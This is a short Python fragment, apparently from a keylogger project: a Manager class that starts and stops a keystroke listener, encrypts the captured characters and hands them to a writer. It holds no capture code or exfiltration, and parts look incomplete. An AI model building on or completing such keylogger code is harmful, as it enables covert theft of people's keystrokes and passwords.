...
class Manager:
    ...
    def start(self):
        Writer(EncryptorDecryptor.encrypt(self.key_loger.start())) # returns on a

    def thread_stop(self):
        self.key_loger.stop_listen()

    def run_time(self, timer: int):
        self.key_loger.start(timer)
       
    def encrypt(self, list_of_chars):
       encrypted_string = EncryptorDecryptor.encrypt(list_of_chars)
       self.write(encrypted_string)

    def decrypt(self, encrypted_string):
        decrypted_string = EncryptorDecryptor.decrypt(encrypted_string)
        self.write(decrypted_string)
    
    def write(self, encrypted_string):
        Writer(encrypted_string)
